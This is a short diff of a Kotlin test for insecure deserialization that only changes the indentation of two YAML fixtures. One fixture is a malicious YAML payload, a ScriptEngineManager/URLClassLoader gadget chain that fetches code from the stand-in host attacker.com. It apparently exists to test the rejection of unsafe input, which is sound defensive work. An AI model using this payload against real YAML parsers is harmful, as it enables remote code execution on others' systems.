@@ -10,19 +10,19 @@ class InsecureDeserializationTest {
     val insecureDeserialization = InsecureDeserialization()
 
     val safeYaml = """
-            name: Test
-            value: 42
-            enabled: true
-            list:
-              - item1
-              - item2
+        name: Test
+        value: 42
+        enabled: true
+        list:
+          - item1
+          - item2
     """.trimIndent()
 
     val maliciousYaml = """
-            !!javax.script.ScriptEngineManager [
-              !!java.net.URLClassLoader [[
-                !!java.net.URL ["http://attacker.com/"]
-              ]]
+        !!javax.script.ScriptEngineManager [
+          !!java.net.URLClassLoader [[
+            !!java.net.URL ["http://attacker.com/"]
+          ]]
     """.trimIndent()
 
     @Test
